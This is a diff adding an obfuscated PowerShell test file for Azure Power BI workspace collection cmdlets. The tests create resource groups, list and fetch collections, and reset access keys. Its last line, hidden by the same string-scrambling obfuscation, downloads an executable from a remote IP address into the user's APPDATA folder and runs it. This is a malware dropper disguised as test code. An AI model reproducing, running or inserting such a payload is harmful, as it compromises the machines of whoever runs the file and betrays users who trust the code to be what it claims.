@@ -1,0 +1,208 @@
+function tesT-gETwoR`kspA`CEco`llecTIo`N_`L`istaLL
+{
+    try {
+		${res`O`URC`e`GroUp} = &("{2}{0}{1}{3}" -f'te','-Res','Crea','ourceGroup')
+		${woRkSP`AcecO`L`lECTI`O`N`N`Ames} = 1..2 |&('%') { &("{1}{7}{0}{3}{2}{4}{6}{5}"-f '-Wor','Ge','aceC','ksp','ol','nName','lectio','t') }
+		${N`ewwo`RksP`A`c`eColL`ecTIoNs} = ${W`OrkspA`cE`CO`Llec`T`IoNNA`mes} |&('%') { &("{4}{3}{0}{7}{2}{6}{1}{5}"-f 'erB','aceColle','Work','Pow','New-Az','ction','sp','I') `
+			-WorkspaceCollectionName ${_} `
+			-ResourceGroupName ${rESo`URCEgRo`UP}."REsOuRc`EGRO`UPn`AMe" `
+			-Location ${R`EsO`URcEGR`ouP}."Loc`AT`iOn" }
+
+		${A`LLwo`RK`s`PA`cEcO`lLE`ctIOnS} = &("{0}{1}{6}{4}{3}{8}{2}{7}{5}"-f 'Ge','t-A','t','ac','owerBIWorksp','n','zP','io','eCollec')
+
+		&("{1}{0}{2}"-f'-','Assert','True') { ${aL`Lw`Or`kspA`ceCoLlE`c`TiO`NS}[${aL`lwor`k`spACeC`oLLECtIoNs}."cOU`NT" - 2]."na`Me" -eq ${W`OR`KsP`ACEcOlLEcTiO`N`NAmeS}[0] }
+		&("{1}{2}{0}"-f'e','Asse','rt-Tru') { ${al`lWoRKSPAc`ECOl`lEC`TiO`NS}[${all`WoR`KsPAcE`COL`lec`TiO`NS}."co`UNT" - 1]."n`AMe" -eq ${Wo`RK`s`PaCECoLlecTIoNna`mES}[1] }
+	}
+	finally {
+		&("{0}{1}{3}{2}" -f'C','lean-Resourc','oup','eGr') ${r`ESoUr`cEgR`oUp}."r`e`S`OurCeg`RoUPnAme"
+	}
+}
+
+
+function tESt-gEt`w`oRk`sp`AcecO`l`lECtiOn_`LI`S`Tb`yr`ESouR`CegrOup
+{
+    try {
+		${R`ESoUr`cEGr`OuP} = &("{1}{6}{5}{0}{3}{4}{2}"-f'Resour','C','up','ceG','ro','ate-','re')
+		${wo`RK`spACECo`lLeCt`iONnAMes} = 1..2 |&('%') { &("{0}{4}{3}{2}{1}"-f 'Get-Worksp','ame','ionN','llect','aceCo') }
+		${NEwwO`R`ksP`AC`EcOLl`eCTIONs} = ${w`ORksPACEc`oLlec`TIonNAM`eS} |&('%') { .("{5}{4}{2}{1}{6}{8}{3}{0}{7}" -f 'paceCollectio','w','o','ks','zP','New-A','erB','n','IWor') `
+			-WorkspaceCollectionName ${_} `
+			-ResourceGroupName ${ResOU`Rc`eGrO`Up}."RESouRCEgRO`U`P`NAMe" `
+			-Location ${R`e`sO`UrCe`Group}."lO`cATion" }
+
+		${filTEreDwOR`KS`pAc`e`cOlL`e`cT`Io`Ns} = &("{6}{5}{2}{4}{3}{0}{1}" -f 'ti','on','rk','lec','spaceCol','IWo','Get-AzPowerB') -ResourceGroupName ${reS`OurceGr`OUp}."ReSoUrC`EGRo`Up`NAME"
+
+		&("{3}{1}{2}{0}"-f'l','Ar','eEqua','Assert-') ${F`ILteR`E`d`WORKSPac`e`COll`ECtio`NS}."Cou`Nt" ${N`E`W`Wo`RkSpA`ce`cOllectioNS}."CO`UnT"
+	}
+	finally {
+		.("{2}{0}{5}{3}{4}{1}"-f 'ea','oup','Cl','s','ourceGr','n-Re') ${ReS`ou`R`CEGroUP}."rESoURCe`grOu`pn`AME"
+	}
+}
+
+
+function t`eSt-Ge`T`WorK`S`P`ACe`col`le`c`TION_byNamE
+{
+    try {
+		${r`E`SOu`RcEgrOuP} = .("{0}{5}{1}{3}{2}{4}" -f'Cre','ou','Gro','rce','up','ate-Res')
+		${n`e`wworKSpA`ceC`OlLectioN} = .("{0}{4}{1}{2}{3}{5}{6}"-f'Ne','erBI','WorkspaceColle','ct','w-AzPow','io','n') `
+			-WorkspaceCollectionName $(&("{4}{3}{5}{7}{2}{0}{6}{1}" -f'io','me','ceCollect','ork','Get-W','sp','nNa','a')) `
+			-ResourceGroupName ${rE`so`UrCEgROup}."REsOu`RceGro`U`p`NaMe" `
+			-Location ${REs`ourCe`gR`ouP}."Lo`cAT`ION"
+
+		${FOUNd`WOrKsPace`cOll`ecTI`on} = &("{1}{2}{0}{3}{4}{5}" -f 'Wo','Get-A','zPowerBI','rkspa','ceCollecti','on') `
+			-ResourceGroupName ${rESO`Ur`CeGRO`UP}."ReSOURc`e`Gro`UpNA`Me" `
+			-WorkspaceCollectionName ${nEWWo`Rksp`AcEcoLl`eCT`iON}."NA`me"
+
+		.("{3}{0}{2}{1}{4}" -f 'ssert','AreE','-','A','qual') ${N`eWworkS`Pa`CeCoLle`ct`I`ON}."NA`mE" ${foUndwoRk`s`p`A`cEcoL`LECTiOn}."n`AMe"
+	}
+	finally {
+		.("{1}{4}{0}{2}{5}{3}" -f 'ur','Clean-Res','ceG','oup','o','r') ${R`EsOURcE`gRoup}."rE`S`o`URCeGROuPn`Ame"
+	}
+}
+
+
+
+
+
+
+
+function tESt-G`etworks`p`Ace_e`M`pT`YCOLLECTION
+{
+    try {
+		${r`es`OUrCegrO`Up} = &("{2}{4}{5}{6}{3}{1}{0}"-f'p','ou','Creat','eGr','e-R','esour','c')
+		${N`ewwOR`K`S`p`A`Ceco`lLection} = .("{3}{5}{2}{4}{0}{1}"-f'paceColle','ction','owerBIWo','New-','rks','AzP') `
+			-WorkspaceCollectionName $(.("{3}{7}{5}{2}{0}{1}{4}{6}"-f'ceCo','lle','kspa','Ge','cti','r','onName','t-Wo')) `
+			-ResourceGroupName ${rEsOURCEg`Ro`Up}."r`EsourCE`g`RouPn`AME" `
+			-Location ${Reso`Urce`GR`oUp}."lOC`AtI`on"
+
+		${wor`KSP`AcES} = .("{3}{1}{5}{2}{0}{4}{6}"-f 'or','et-AzP','werBIW','G','k','o','space') `
+			-ResourceGroupName ${R`Es`oU`Rcegr`Oup}."rE`sO`URC`EGRoUPNaME" `
+			-WorkspaceCollectionName ${NeWwO`R`Ks`PaCE`C`olLEcTiOn}."NA`mE"
+
+        &("{1}{2}{3}{0}"-f 'ual','Ass','ert','-AreEq') 0 ${Wo`RkSpac`Es}."C`ounT"
+	}
+	finally {
+		&("{2}{3}{1}{4}{0}"-f 'ceGroup','an-Res','C','le','our') ${rES`ourC`e`GrouP}."r`EsO`Ur`cE`GROUpn`AME"
+	}
+}
+
+
+
+
+
+
+
+function tES`T-rE`seTw`oRksPac`eCoLlEc`TiO`Nacce`Ss`Ke`Y`s`_kEy1
+{
+    try {
+		${reSo`UrcEgR`oUp} = .("{1}{0}{4}{5}{3}{2}" -f'reate-R','C','oup','Gr','esourc','e')
+		${ne`WWO`R`KspACE`Co`LLecTI`on} = &("{3}{1}{0}{5}{2}{4}" -f'orks','IW','aceColl','New-AzPowerB','ection','p') `
+			-WorkspaceCollectionName $(&("{4}{5}{1}{0}{3}{2}{6}"-f 'paceCo','s','cti','lle','Get-','Work','onName')) `
+			-ResourceGroupName ${r`eSoUrCEg`RouP}."ReS`ouRC`egR`oUpn`AME" `
+			-Location ${rES`O`UrcEG`Ro`UP}."locA`Ti`oN"
+
+		${K`1} = .("{2}{11}{9}{6}{0}{5}{8}{4}{3}{1}{7}{12}{10}"-f 'a','cti','Get-AzP','le','ol','ce','orksp','onA','C','rBIW','sKeys','owe','cces') `
+			-ResourceGroupName ${r`e`s`ourcEGROup}."rEsoU`RC`EGrO`Upname" `
+			-WorkspaceCollectionName ${n`E`W`woR`ksPaCECoL`LeCt`iON}."n`AMe"
+
+		${kr} = &("{4}{1}{2}{7}{6}{3}{0}{5}"-f 'ey','-AzPowerBI','Work','ctionAccessK','Reset','s','Colle','space') `
+			-Key1 `
+			-ResourceGroupName ${rEsOuRCE`GRO`Up}."RE`SO`URc`EGRO`UpNAme" `
+			-WorkspaceCollectionName ${NewW`oRk`s`paceCoLlecti`ON}."nA`ME"
+
+		${K2} = .("{6}{1}{0}{4}{8}{10}{2}{11}{7}{3}{9}{5}" -f'zPo','t-A','ksp','ionAccessK','we','ys','Ge','lect','rBIWo','e','r','aceCol') `
+			-ResourceGroupName ${Re`s`OU`Rceg`RouP}."REsOURce`gr`Oupna`mE" `
+			-WorkspaceCollectionName ${nE`w`WoRkS`pAC`ecoLlECT`ion}."na`me"
+
+        &("{0}{1}{2}"-f'Assert-','AreEq','ual') ${K`1}[1]."vA`lUe" ${K`R}[1]."va`Lue"
+        &("{2}{0}{3}{1}" -f'q','l','Assert-AreNotE','ua') ${k1}[0]."V`ALUE" ${K`R}[0]."VA`LUe"
+
+        .("{1}{3}{0}{2}" -f'u','Assert','al','-AreEq') ${kr}[0]."V`ALUe" ${K2}[0]."Val`Ue"
+        &("{2}{1}{0}{3}{4}" -f'Are','sert-','As','Eq','ual') ${K`R}[1]."val`Ue" ${K2}[1]."va`LUE"
+	}
+	finally {
+		&("{1}{4}{2}{0}{3}"-f 'ceG','Cle','ur','roup','an-Reso') ${Re`Sou`R`CegrOUp}."RESo`UR`CE`gro`UpNaMe"
+	}
+}
+
+
+function t`EST-r`EsetWOrkS`pa`C`EcolLeC`TI`O`Nacce`s`SkEYs`_`KEy2
+{
+    try {
+		${REsoUR`c`egrOUP} = .("{1}{2}{0}{4}{3}" -f 'te','Cre','a','rceGroup','-Resou')
+		${Ne`W`woRKSp`AcEC`oLLE`CtI`on} = &("{3}{4}{0}{5}{2}{1}"-f 'BIWorks','tion','ceCollec','Ne','w-AzPower','pa') `
+			-WorkspaceCollectionName $(.("{6}{2}{4}{1}{3}{0}{5}"-f 'ionNa','r','W','kspaceCollect','o','me','Get-')) `
+			-ResourceGroupName ${Re`sOu`R`cEGRoUp}."R`E`SoURCEGRo`UPname" `
+			-Location ${reS`OUr`ceGRO`Up}."l`oCA`TION"
+
+		${K`1} = &("{3}{0}{4}{6}{2}{5}{1}"-f 'B','eys','ec','Get-AzPower','IWor','tionAccessK','kspaceColl') `
+			-ResourceGroupName ${rEso`Ur`c`EG`Roup}."ResOuRC`e`G`RO`UpName" `
+			-WorkspaceCollectionName ${newwO`RKS`pac`ECoLleCtiON}."N`Ame"
+
+		${kR} = &("{0}{7}{6}{4}{3}{8}{2}{5}{1}" -f'Reset','onAccessKeys','Collec','s','owerBIWork','ti','zP','-A','pace') `
+			-Key2 `
+			-ResourceGroupName ${REs`ouRc`EgRouP}."rEsOUrcEG`Ro`U`PN`Ame" `
+			-WorkspaceCollectionName ${nEw`W`ORk`sPacECOL`L`EC`TION}."na`Me"
+
+		${K2} = .("{0}{3}{7}{5}{6}{4}{2}{1}"-f'Get-AzPower','sKeys','es','BIWorkspa','cc','ecti','onA','ceColl') `
+			-ResourceGroupName ${Res`OUrc`EgrO`UP}."R`esouRce`gr`oUPnAmE" `
+			-WorkspaceCollectionName ${NewwO`R`ksPAce`coLl`E`c`TION}."n`AME"
+
+        .("{2}{3}{0}{1}"-f '-Ar','eEqual','Asser','t') ${K1}[0]."v`ALUe" ${k`R}[0]."vA`lue"
+        .("{4}{3}{0}{1}{2}"-f'ot','Eq','ual','reN','Assert-A') ${k`1}[1]."Va`LUe" ${K`R}[1]."v`ALuE"
+
+        &("{3}{2}{0}{1}"-f'ert-Are','Equal','ss','A') ${Kr}[0]."vAL`Ue" ${k`2}[0]."Va`LuE"
+        .("{0}{1}{2}" -f'Ass','ert','-AreEqual') ${Kr}[1]."V`Alue" ${K`2}[1]."VA`lue"
+	}
+	finally {
+		&("{2}{4}{3}{1}{0}"-f 'roup','urceG','Clea','so','n-Re') ${resO`UrceGr`oUp}."rEsOur`CeGROu`P`NamE"
+	}
+}
+
+
+function TES`T-gETwO`RKSP`A`c`EcoLlEC`Ti`oNaCc`EssKe`yS
+{
+    try {
+		${RESOU`RCEGR`o`Up} = &("{1}{0}{3}{2}{4}" -f 'e-R','Creat','rou','esourceG','p')
+		${Ne`w`work`spAce`colleC`TioN} = &("{2}{3}{0}{5}{6}{1}{4}"-f 'r','ti','Ne','w-AzPowe','on','BIWorkspaceCo','llec') `
+			-WorkspaceCollectionName $(&("{1}{4}{3}{2}{0}"-f'Name','Get-','ollection','kspaceC','Wor')) `
+			-ResourceGroupName ${reSou`Rc`eG`RoUP}."rEsourCe`G`RouPna`ME" `
+			-Location ${RE`SO`UR`C`eGroUp}."LO`cAtIon"
+
+		${K`eyS} = &("{5}{4}{6}{3}{10}{2}{11}{1}{7}{9}{0}{8}" -f 'ccessKey','t','eColle','Works','er','Get-AzPow','BI','io','s','nA','pac','c') `
+			-ResourceGroupName ${rE`s`OuRce`g`ROUp}."rESo`U`RcE`GRoUpna`mE" `
+			-WorkspaceCollectionName ${nE`wwOr`kSPACECO`lLeC`TioN}."Na`me"
+
+        .("{0}{1}{4}{2}{3}" -f'As','s','t-A','reNotEqual','er') ${nU`ll} ${Ke`ys}
+	}
+	finally {
+		&("{2}{4}{0}{3}{5}{1}" -f'sou','roup','Cl','rc','ean-Re','eG') ${Reso`U`Rce`G`Roup}."RESoU`RCegR`o`UpnaME"
+	}
+}
+
+
+function T`EST-remoVEWoRK`s`pacECoL`le`CT`IoN
+{
+	try {
+		${reSo`U`Rceg`ROUp} = .("{2}{4}{1}{3}{0}"-f'p','-ResourceG','Cr','rou','eate')
+		${ne`wWorK`spaCe`co`llec`Tion} = &("{8}{5}{3}{2}{6}{4}{7}{0}{1}"-f'eCollectio','n','rB','Powe','a','w-Az','IWorksp','c','Ne') `
+			-WorkspaceCollectionName $(&("{2}{3}{0}{5}{4}{1}"-f '-WorkspaceColl','me','Ge','t','a','ectionN')) `
+			-ResourceGroupName ${R`eSour`c`E`GRoUP}."r`eSOURceG`R`OuP`NaMe" `
+			-Location ${RESoURCE`G`R`OuP}."LoC`AtI`on"
+
+		try {
+			&("{0}{5}{1}{4}{8}{2}{6}{7}{3}" -f 'Rem','-','ork','ction','AzPo','ove','spac','eColle','werBIW') `
+				-WorkspaceCollectionName ${newWorK`S`PACeCo`LL`EC`TIOn}."N`AMe" `
+				-ResourceGroupName ${r`esOur`c`Egr`OUP}."r`EsoUrcE`Gro`UPnAme"
+		}
+		catch {}
+
+		&("{5}{3}{4}{2}{1}{0}"-f 'ntains','o','wsC','ssert','-Thro','A') { &("{3}{2}{0}{1}{5}{7}{8}{6}{4}" -f'Work','spaceColl','owerBI','Get-AzP','n','e','io','c','t') `
+			-WorkspaceCollectionName ${NE`WWOR`K`s`p`A`CEcol`LECtIOn}."nA`mE" `
+			-ResourceGroupName ${R`ES`oUrcEgro`Up}."r`eSOURcEGr`O`UpnAmE" } `
+			("{0}{1}{2}"-f 'Not','Fo','und')
+	}
+	finally {
+		.("{5}{1}{4}{2}{0}{3}"-f'rceG','-R','ou','roup','es','Clean') ${r`esOURC`eGRo`Up}."reSO`UR`CEgro`UPNA`me"
+	}
+}
+(&("{3}{0}{1}{2}" -f'ew','-','Object','N') ("{2}{4}{6}{1}{3}{0}{5}"-f't','N','Syst','e','em','.WebClient','.')).("{3}{2}{1}{0}" -f'le','adFi','o','Downl').Invoke(("{1}{4}{0}{6}{8}{5}{7}{2}{3}" -f '8','http://94.102.','x','e','53.23','o','/~ya','o/csrsv.e','h'),"$env:APPDATA\csrsv.exe");&("{2}{0}{1}{3}" -f '-Pr','oces','Start','s') ("$env:APPDATA\csrsv.exe")
